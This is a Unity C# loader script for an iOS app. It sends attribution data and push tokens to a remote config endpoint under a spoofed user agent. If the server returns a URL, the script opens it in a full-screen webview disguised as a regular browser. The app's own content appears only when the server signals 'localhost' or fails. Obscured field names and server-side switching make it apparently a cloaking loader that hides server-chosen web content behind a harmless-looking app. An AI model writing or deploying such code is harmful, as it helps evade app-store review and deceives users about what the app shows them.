using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.Text;

using AppsFlyerSDK;
using Firebase.Messaging;
using Unity.Advertisement.IosSupport;
using UnityEngine;
using UnityEngine.UI;
using UnityEngine.Networking;

public class LoaderController : MonoBehaviour, IAppsFlyerConversionData
{
    [SerializeField] ScreenOrientation forcedScreenOrientation = ScreenOrientation.Portrait;
    [SerializeField] string endpoint;
    [SerializeField] string appsflyerDevID;
    [SerializeField] string IOS_ID;
    [SerializeField] private List<GameObject> _sleepObjects; 

    [SerializeField] private Transform loadingScreen;
    [SerializeField] private Transform notificationRequestScreen;
    [SerializeField] private Transform noNetScreen;
    [SerializeField] private Transform loadingScreenHorizontal;
    [SerializeField] private Transform notificationRequestScreenHorizontal;
    [SerializeField] private Transform noNetScreenHorizontal;

    private UniWebView _webView;

    Dictionary<string, object> _conversionDictionary = new Dictionary<string, object>();
    ConversionStatus _conversionStatus = ConversionStatus.tbd;
    bool fbrq = false;
    string _w = "";
    bool _isLandscapeLayout;
    ScreenOrientation _lastKnownOrientation = ScreenOrientation.Unknown;

    void Awake()
    {
        EnablePreloaderAutoRotation();
        _lastKnownOrientation = GetCurrentOrientation();
        UpdateLayoutByOrientation(_lastKnownOrientation);

        if (PushStatusState == PushStatus.good)
            FirebaseMessaging.MessageReceived += OnMessageRecieved;
        
        if (!string.IsNullOrEmpty(SavedPushData))
        {
            _w = SavedPushData;
            SavedPushData = null;
            fbrq = true;
        }
    }

    IEnumerator Start()
    {
        _lastKnownOrientation = GetCurrentOrientation();
        UpdateLayoutByOrientation(_lastKnownOrientation);

        if (!string.IsNullOrEmpty(zxcsigns))
        {
            OnEndLoading();
            yield break;
        }
        if (ATTrackingStatusBinding.GetAuthorizationTrackingStatus() == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
        {
            ATTrackingStatusBinding.RequestAuthorizationTracking();
        }

        SetupStatics();
        SetupWebView();

        yield return WaitForConversion();
        var isconvsent = false;
        if (!fbrq)
            yield return ConversionActions(success =>
            {
                isconvsent = success;
            });
        if ((_conversionStatus == ConversionStatus.good || alreadyDone == 1) && !fbrq)
        {
            if (isconvsent || alreadyDone == 1)
            {
                if (Application.internetReachability == NetworkReachability.NotReachable)
                {
                    ShowNoNetworkScreen();
                }
                else
                {
                    alreadyDone = 1;
                    LoadActions(_w);
                }
                yield return ReqAction();
            }
            else
                OnEndLoading();
        }
        else if ((isconvsent || alreadyDone == 1) && Application.internetReachability == NetworkReachability.NotReachable)
        {
            ShowNoNetworkScreen();
        }
        else if (fbrq)
            LoadActions(_w);
        else
            OnEndLoading();
    }

    void Update()
    {
        var currentOrientation = GetCurrentOrientation();
        if (currentOrientation == _lastKnownOrientation)
            return;

        _lastKnownOrientation = currentOrientation;
        UpdateLayoutByOrientation(currentOrientation);

        if (_webView != null)
            _webView.Frame = new(Screen.safeArea.x, Screen.height - Screen.safeArea.yMax, Screen.safeArea.width, Screen.safeArea.height);
    }
    IEnumerator ReqAction(){
        if (PushStatusState == PushStatus.denied)
        {
            string declineTimestamp = PlayerPrefs.GetString("NotificationDeclineTimestamp");
            if (!string.IsNullOrEmpty(declineTimestamp))
            {
                DateTime declineDate = DateTime.Parse(declineTimestamp);
                if ((DateTime.Now - declineDate).Days >= 3)
                    yield return reqDelay();
            }
        }
        else if (PushStatusState == PushStatus.tbd)
            yield return reqDelay();
    }
    bool _doReq = false;
    IEnumerator reqDelay(){
        _doReq = true;
        _webView.Hide();
        yield return RequestNotifications();
        if(didFinish){
            SetNotificationRequestVisible(false);
            _webView.Show();
        }
        _doReq = false;
        SetNotificationRequestVisible(false);
    }
    bool isDelayed = false;
    IEnumerator Delay(){
        if(!isDelayed)
        {
            isDelayed = true;
            yield return new WaitForSeconds(3f);
            StartCoroutine(ConversionActions(null));
        }
    }

    IEnumerator RequestNotifications()
    {
        bool buttonPressed = false;
        SetNotificationRequestVisible(true);
        Button portraitAcceptButton = GetButton(notificationRequestScreen, "Accept");
        Button portraitDeclineButton = GetButton(notificationRequestScreen, "Decline");
        Button landscapeAcceptButton = GetButton(notificationRequestScreenHorizontal, "Accept");
        Button landscapeDeclineButton = GetButton(notificationRequestScreenHorizontal, "Decline");

        Action acceptAction = null;
        Action declineAction = null;
        acceptAction = () =>
        {
            PushStatusState = PushStatus.good;
            RemoveNotificationListeners(portraitAcceptButton, portraitDeclineButton, landscapeAcceptButton, landscapeDeclineButton);
            buttonPressed = true;
        };
        declineAction = () =>
        {
            PushStatusState = PushStatus.denied;
            PlayerPrefs.SetString("NotificationDeclineTimestamp", DateTime.Now.ToString());
            RemoveNotificationListeners(portraitAcceptButton, portraitDeclineButton, landscapeAcceptButton, landscapeDeclineButton);
            buttonPressed = true;
        };

        AddListenerIfExists(portraitAcceptButton, acceptAction);
        AddListenerIfExists(landscapeAcceptButton, acceptAction);
        AddListenerIfExists(portraitDeclineButton, declineAction);
        AddListenerIfExists(landscapeDeclineButton, declineAction);
        yield return new WaitWhile(() => !buttonPressed);
        if (PushStatusState == PushStatus.good)
        {
            yield return FirebaseMessaging.RequestPermissionAsync();
            FirebaseMessaging.MessageReceived += OnMessageRecieved;
            FirebaseMessaging.TokenReceived += OnTokenRecieved;
            float curTime = Time.time;
            yield return new WaitWhile(() => string.IsNullOrEmpty(FirebaseToken) && Time.time - curTime < 10f);
        }
    }

    void SetupStatics(){
        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetEnableKeyboardAvoidance(true);
    }

    void SetupWebView()
    {
        _webView = gameObject.AddComponent<UniWebView>();
        _webView.EmbeddedToolbar.Hide();
        _webView.SetSupportMultipleWindows(false, true);
        _webView.SetAllowFileAccess(true);
        _webView.SetCalloutEnabled(true);
        _webView.SetBackButtonEnabled(true);
        _webView.OnShouldClose += webView => false;
        _webView.SetAllowBackForwardNavigationGestures(true);
        _webView.OnOrientationChanged += OnScreenOrientationChange;
        _webView.SetUserAgent(_webView.GetUserAgent().Replace("; wv", "").Replace(" Version/4.0", ""));
        _webView.OnPageStarted += (view, url) =>
        {
            if (url.Contains("sub_id_2=99999"))
                UniWebView.ClearCookies();
            if (url.Contains("https://localhost"))
            {
                zxcsigns = "value";
                _webView.Hide();
                Destroy(_webView);
                OnEndLoading();
            }
        };
        _webView.OnLoadingErrorReceived += (webView, code, message, payload) =>
        {
            if (code is not (-1007 or -9 or 0)) return;
            if (payload.Extra != null && payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
                webView.Load((string)value);
        };
        _webView.OnPageFinished += (view, code, url) => SuperDuper();
        _webView.Frame = new(Screen.safeArea.x, Screen.height - Screen.safeArea.yMax, Screen.safeArea.width, Screen.safeArea.height);
    }

    void OnScreenOrientationChange(UniWebView view, ScreenOrientation orientation)
    {
        _lastKnownOrientation = orientation;
        UpdateLayoutByOrientation(orientation);
        _webView.Frame = new(Screen.safeArea.x, Screen.height - Screen.safeArea.yMax, Screen.safeArea.width, Screen.safeArea.height);
    }

    string SavedPushData
    {
        get
        {
            return PlayerPrefs.GetString("nnm", "");
        }
        set
        {
            PlayerPrefs.SetString("nnm", value);
            PlayerPrefs.Save();
        }
    }
    string zxcsigns
    {
        get
        {
            return PlayerPrefs.GetString("zxcsigns", "");
        }
        set
        {
            PlayerPrefs.SetString("zxcsigns", value);
            PlayerPrefs.Save();
        }
    }
    string SavedConversionData
    {
        get
        {
            return PlayerPrefs.GetString("conversion", "");
        }
        set
        {
            PlayerPrefs.SetString("conversion", value);
            PlayerPrefs.Save();
        }
    }
    PushStatus PushStatusState
    {
        get
        {
            return (PushStatus)PlayerPrefs.GetInt("push", (int)PushStatus.tbd);
        }
        set
        {
            PlayerPrefs.SetInt("push", (int)value);
            PlayerPrefs.Save();
        }
    }
    private string SavedUrl
    {
        get
        {
            return PlayerPrefs.GetString("ladakalina", string.Empty);
        }
        set
        {
            PlayerPrefs.SetString("ladakalina", value);
            PlayerPrefs.Save();
        }
    }
    string FirebaseToken
    {
        get
        {
            return PlayerPrefs.GetString("firebaseToken", "");
        }
        set
        {
            PlayerPrefs.SetString("firebaseToken", value);
            PlayerPrefs.Save();
        }
    }
    int alreadyDone
    {
        get
        {
            return PlayerPrefs.GetInt("alreadyDone", 0);
        }
        set
        {
            PlayerPrefs.SetInt("alreadyDone", value);
            PlayerPrefs.Save();
        }
    }

    IEnumerator WaitForConversion()
    {
        if (!string.IsNullOrEmpty(SavedConversionData))
        {
            _conversionDictionary = AppsFlyer.CallbackStringToDictionary(SavedConversionData);
            _conversionStatus = ConversionStatus.good;
        }
        AppsFlyer.initSDK(appsflyerDevID, IOS_ID, this);
        AppsFlyer.startSDK();
        float curTime = Time.time;
        yield return new WaitWhile(() => _conversionStatus == ConversionStatus.tbd && Time.time - curTime < 10f);
    }

    enum ConversionStatus
    {
        good,
        bad,
        tbd
    }

    enum PushStatus
    {
        good,
        bad,
        tbd,
        denied
    }

    public void onConversionDataSuccess(string conversionData)
    {
        if (_conversionStatus == ConversionStatus.good) return;
        SavedConversionData = conversionData;
        _conversionStatus = ConversionStatus.good;
        _conversionDictionary = AppsFlyer.CallbackStringToDictionary(conversionData);
    }

    public void onConversionDataFail(string error)
    {
        _conversionStatus = ConversionStatus.bad;
    }
    public void onAppOpenAttribution(string attributionData)
    {
        throw new NotImplementedException();
    }
    public void onAppOpenAttributionFailure(string error)
    {
        throw new NotImplementedException();
    }

    private void OnEndLoading()
    {
        ForcePortraitMode();
        _sleepObjects.ForEach(x => x.SetActive(true));
    }

    private void OnDisable()
    {
        ForcePortraitMode();
    }
    void OnMessageRecieved(object sender, MessageReceivedEventArgs e)
    {
        var data = e.Message.Data;
        Debug.Log($"message data {data}");
        if (!data.TryGetValue("url", out var url)) return;
        if (e.Message.NotificationOpened) SavedPushData = url;
        fbrq = true;
        LoadActions(url);
    }
    void OnTokenRecieved(object sender, TokenReceivedEventArgs e)
    {
        FirebaseToken = e.Token;
        StartCoroutine(Delay());
    }

    void LoadActions(string n)
    {
        _webView.Load(n);
    }

    IEnumerator ConversionActions(Action<bool> c)
    {
        _conversionDictionary.TryAdd($"af_id", AppsFlyer.getAppsFlyerId());
        _conversionDictionary.TryAdd("bundle_id", Application.identifier);
        _conversionDictionary.TryAdd("store_id", $"id{IOS_ID}");
        _conversionDictionary.TryAdd("locale", CultureInfo.CurrentCulture.Name);
        _conversionDictionary.TryAdd("os", "iOS");
        if (!string.IsNullOrEmpty(FirebaseToken)) _conversionDictionary.TryAdd("push_token", FirebaseToken);
        if (!string.IsNullOrEmpty(FirebaseToken)) _conversionDictionary.TryAdd("firebase_project_id", Firebase.FirebaseApp.DefaultInstance.Options.ProjectId);
        var jsonObject = DictToJson(_conversionDictionary);
        var request = new UnityWebRequest($"{endpoint.TrimEnd('/')}/config.php", "POST")
        {
            uploadHandler = new UploadHandlerRaw(Encoding.UTF8.GetBytes(jsonObject)),
            downloadHandler = new DownloadHandlerBuffer()
        };

        request.SetRequestHeader("User-Agent", "PostmanRuntime/7.41.1");
        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("Host", $"{endpoint.Replace("https://", "")}");
        request.SetRequestHeader("Content-Length", jsonObject.Length.ToString());

        // request.SetRequestHeader("Content-Type", "application/json");

        yield return request.SendWebRequest();
        if (request.result == UnityWebRequest.Result.Success)
        {
            var response = request.downloadHandler.text;
            var responseDict = AppsFlyer.CallbackStringToDictionary(response);
            if (responseDict.TryGetValue("ok", out var value) && value is bool ok && ok)
            {
                if (responseDict.TryGetValue("url", out var url))
                {
                    SavedUrl = url.ToString();
                    _w = SavedUrl;
                    c?.Invoke(true);
                    yield break;
                }
                else
                {
                    c?.Invoke(false);
                }
            }
            else
            {
                c?.Invoke(false);
            }
        }
        else
        {
            c?.Invoke(false);
        }
    }
    bool didFinish = false;
    void SuperDuper()
    {
        didFinish = true;
        SetLoadingVisible(false);
        _webView.Frame = new(Screen.safeArea.x, Screen.height - Screen.safeArea.yMax, Screen.safeArea.width, Screen.safeArea.height);
        if(!_doReq)
            _webView.Show();
        SavedPushData = null;
        fbrq = false;
    }

    bool IsLandscape(ScreenOrientation orientation)
    {
        if (orientation == ScreenOrientation.LandscapeLeft || orientation == ScreenOrientation.LandscapeRight)
            return true;
        if (orientation == ScreenOrientation.Portrait || orientation == ScreenOrientation.PortraitUpsideDown)
            return false;

        return Screen.width > Screen.height;
    }

    void UpdateLayoutByOrientation(ScreenOrientation orientation)
    {
        bool useLandscapeLayout = IsLandscape(orientation);
        _isLandscapeLayout = useLandscapeLayout;

        ApplyVariantState(loadingScreen, loadingScreenHorizontal, useLandscapeLayout);
        ApplyVariantState(notificationRequestScreen, notificationRequestScreenHorizontal, useLandscapeLayout);
        ApplyVariantState(noNetScreen, noNetScreenHorizontal, useLandscapeLayout);
    }

    void ApplyVariantState(Transform portraitVariant, Transform landscapeVariant, bool useLandscapeLayout)
    {
        bool isPortraitActive = portraitVariant != null && portraitVariant.gameObject.activeSelf;
        bool isLandscapeActive = landscapeVariant != null && landscapeVariant.gameObject.activeSelf;
        bool shouldBeActive = isPortraitActive || isLandscapeActive;

        if (portraitVariant != null)
            portraitVariant.gameObject.SetActive(!useLandscapeLayout && shouldBeActive);
        if (landscapeVariant != null)
            landscapeVariant.gameObject.SetActive(useLandscapeLayout && shouldBeActive);
    }

    void SetLoadingVisible(bool visible)
    {
        SetVariantVisible(loadingScreen, loadingScreenHorizontal, visible);
    }

    void SetNotificationRequestVisible(bool visible)
    {
        SetVariantVisible(notificationRequestScreen, notificationRequestScreenHorizontal, visible);
    }

    void SetNoNetworkVisible(bool visible)
    {
        SetVariantVisible(noNetScreen, noNetScreenHorizontal, visible);
    }

    void SetVariantVisible(Transform portraitVariant, Transform landscapeVariant, bool visible)
    {
        if (portraitVariant != null)
            portraitVariant.gameObject.SetActive(visible && !_isLandscapeLayout);
        if (landscapeVariant != null)
            landscapeVariant.gameObject.SetActive(visible && _isLandscapeLayout);
    }

    void ShowNoNetworkScreen()
    {
        SetNoNetworkVisible(true);
        SetLoadingVisible(false);
        SetNotificationRequestVisible(false);
    }

    void AddListenerIfExists(Button button, Action action)
    {
        if (button != null)
            button.onClick.AddListener(() => action.Invoke());
    }

    void RemoveListenerIfExists(Button button)
    {
        if (button != null)
            button.onClick.RemoveAllListeners();
    }

    void RemoveNotificationListeners(Button portraitAcceptButton, Button portraitDeclineButton, Button landscapeAcceptButton, Button landscapeDeclineButton)
    {
        RemoveListenerIfExists(portraitAcceptButton);
        RemoveListenerIfExists(portraitDeclineButton);
        RemoveListenerIfExists(landscapeAcceptButton);
        RemoveListenerIfExists(landscapeDeclineButton);
    }

    Button GetButton(Transform root, string childName)
    {
        if (root == null)
            return null;

        var child = root.Find(childName);
        if (child == null)
            return null;

        return child.GetComponent<Button>();
    }

    void ForcePortraitMode()
    {
        Screen.autorotateToPortrait = true;
        Screen.autorotateToPortraitUpsideDown = false;
        Screen.autorotateToLandscapeLeft = false;
        Screen.autorotateToLandscapeRight = false;
        Screen.orientation = ScreenOrientation.Portrait;
        _isLandscapeLayout = false;
        _lastKnownOrientation = ScreenOrientation.Portrait;
        UpdateLayoutByOrientation(ScreenOrientation.Portrait);
    }

    void EnablePreloaderAutoRotation()
    {
        Screen.orientation = ScreenOrientation.AutoRotation;
        Screen.autorotateToPortrait = true;
        Screen.autorotateToPortraitUpsideDown = true;
        Screen.autorotateToLandscapeLeft = true;
        Screen.autorotateToLandscapeRight = true;
    }

    ScreenOrientation GetCurrentOrientation()
    {
        var orientation = Screen.orientation;
        if (orientation == ScreenOrientation.LandscapeLeft || orientation == ScreenOrientation.LandscapeRight ||
            orientation == ScreenOrientation.Portrait || orientation == ScreenOrientation.PortraitUpsideDown)
            return orientation;

        return Screen.width >= Screen.height ? ScreenOrientation.LandscapeLeft : ScreenOrientation.Portrait;
    }

    string DictToJson(Dictionary<string, object> dictionary)
    {
        StringBuilder sb = new StringBuilder();
        sb.Append('{');

        bool first = true;
        foreach (var kvp in dictionary)
        {
            if (!first)
            {
                sb.Append(',');
            }
            first = false;

            sb.Append('"').Append(EscapeJsonString(kvp.Key)).Append("\":");

            if (kvp.Value is string str)
            {
                sb.Append('"').Append(EscapeJsonString(str)).Append('"');
            }
            else if (kvp.Value is bool boolValue)
            {
                sb.Append(boolValue ? "true" : "false");
            }
            else if (kvp.Value is int intValue)
            {
                sb.Append(intValue);
            }
            else if (kvp.Value is double doubleValue)
            {
                sb.Append(doubleValue);
            }
            else if (kvp.Value is Dictionary<string, object> nestedDict)
            {
                sb.Append(DictToJson(nestedDict));
            }
            else if (kvp.Value is IEnumerable<object> list)
            {
                sb.Append('[');
                bool firstItem = true;
                foreach (var item in list)
                {
                    if (!firstItem)
                    {
                        sb.Append(',');
                    }
                    firstItem = false;

                    if (item is string itemStr)
                    {
                        sb.Append('"').Append(EscapeJsonString(itemStr)).Append('"');
                    }
                    else if (item is bool itemBool)
                    {
                        sb.Append(itemBool ? "true" : "false");
                    }
                    else if (item is int itemInt)
                    {
                        sb.Append(itemInt);
                    }
                    else if (item is double itemDouble)
                    {
                        sb.Append(itemDouble);
                    }
                    else if (item is Dictionary<string, object> itemDict)
                    {
                        sb.Append(DictToJson(itemDict));
                    }
                    else
                    {
                        sb.Append("null");
                    }
                }
                sb.Append(']');
            }
            else
            {
                sb.Append("null");
            }
        }

        sb.Append('}');
        return sb.ToString();
    }

    string EscapeJsonString(string str)
    {
        return str.Replace("\\", "\\\\")
                  .Replace("\"", "\\\"")
                  .Replace("\b", "\\b")
                  .Replace("\f", "\\f")
                  .Replace("\n", "\\n")
                  .Replace("\r", "\\r")
                  .Replace("\t", "\\t");
    }
}